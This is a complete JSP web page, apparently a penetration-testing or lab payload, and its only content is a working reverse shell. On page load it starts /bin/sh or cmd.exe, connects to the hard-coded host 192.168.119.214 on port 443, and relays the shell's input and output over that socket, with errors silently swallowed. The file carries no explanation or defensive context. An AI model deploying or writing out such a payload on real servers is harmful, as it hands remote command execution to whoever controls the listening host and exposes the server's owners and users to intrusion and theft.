<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream it;
    OutputStream kq;

    StreamConnector( InputStream it, OutputStream kq )
    {
      this.it = it;
      this.kq = kq;
    }

    public void run()
    {
      BufferedReader et  = null;
      BufferedWriter iso = null;
      try
      {
        et  = new BufferedReader( new InputStreamReader( this.it ) );
        iso = new BufferedWriter( new OutputStreamWriter( this.kq ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = et.read( buffer, 0, buffer.length ) ) > 0 )
        {
          iso.write( buffer, 0, length );
          iso.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( et != null )
          et.close();
        if( iso != null )
          iso.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.214", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
